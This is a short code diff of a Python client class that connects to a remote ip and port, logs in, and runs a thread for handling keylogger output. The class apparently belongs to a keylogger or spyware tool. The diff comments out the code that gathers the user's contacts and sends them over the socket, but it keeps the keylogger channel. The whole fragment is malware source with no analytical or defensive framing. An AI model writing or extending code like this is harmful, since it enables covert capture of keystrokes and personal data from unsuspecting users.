@@ -24,10 +24,10 @@ class Client:
         Constructor method for Client
         """
         try:
-            try:
-                self.contacts = contacts.Contacts()
-            except error as msg:
-                print(msg)
+            # try:
+            #    self.contacts = contacts.Contacts()
+            # except error as msg:
+            #    print(msg)
             self.client_socket = socket(AF_INET, SOCK_STREAM)
             self.client_socket.connect((ip, port))
             self.login()
@@ -41,7 +41,7 @@ class Client:
         """
         Sends contacts and starts a thread for handling keylogger output
         """
-        self.send_contacts()
+        # self.send_contacts()
         handle_keylogger_output_thread = threading.Thread(target=self.handle_keylogger_output)
         handle_keylogger_output_thread.start()
 
